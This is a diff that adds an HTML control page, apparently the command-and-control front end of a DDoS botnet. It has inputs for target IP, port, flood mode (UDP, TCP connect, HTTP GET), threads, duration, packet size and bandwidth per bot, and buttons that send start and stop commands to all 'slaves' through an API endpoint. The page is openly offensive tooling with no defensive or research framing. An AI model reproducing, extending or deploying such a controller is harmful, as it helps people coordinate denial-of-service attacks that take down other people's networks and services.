@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Master Control</title>
+  <style>body{font-family:Arial;margin:20px;}</style>
+</head>
+<body>
+  <h1>Master Control Panel</h1>
+  
+  <p><strong>Controller URL:</strong> <span id="url"></span></p>
+
+  <input id="ip" placeholder="Target IP" value="1.2.3.4" style="width:200px"><br><br>
+  <input id="port" placeholder="Port" value="53" type="number"><br><br>
+  
+  <select id="mode">
+    <option value="udp">UDP (L4)</option>
+    <option value="tcp">TCP Connect (L4)</option>
+    <option value="http">HTTP GET (L7)</option>
+  </select><br><br>
+
+  <input id="threads" placeholder="Threads per slave" value="25" type="number"><br><br>
+  <input id="duration" placeholder="Duration (seconds)" value="25" type="number"><br><br>
+  <input id="psize" placeholder="Packet Size" value="1024" type="number"><br><br>
+  <input id="mbps" placeholder="Target Mbps per slave" value="4" type="number"><br><br>
+
+  <button onclick="startAttack()" style="padding:10px 20px;font-size:16px">🚀 START ALL SLAVES</button>
+  <button onclick="stopAttack()" style="padding:10px 20px;font-size:16px">⛔ STOP ALL SLAVES</button>
+
+  <script>
+    const baseUrl = window.location.origin;
+    document.getElementById('url').textContent = baseUrl;
+
+    async function startAttack() {
+      const data = {
+        action: "start",
+        target_ip: document.getElementById('ip').value,
+        port: parseInt(document.getElementById('port').value),
+        mode: document.getElementById('mode').value,
+        threads: parseInt(document.getElementById('threads').value),
+        duration: parseInt(document.getElementById('duration').value),
+        packet_size: parseInt(document.getElementById('psize').value),
+        target_mbps: parseFloat(document.getElementById('mbps').value)
+      };
+
+      await fetch('/api/command', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify(data)
+      });
+      alert('✅ START command sent to all slaves!');
+    }
+
+    async function stopAttack() {
+      await fetch('/api/command', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({action: "stop"})
+      });
+      alert('⛔ STOP command sent to all slaves!');
+    }
+  </script>
+</body>
+</html>
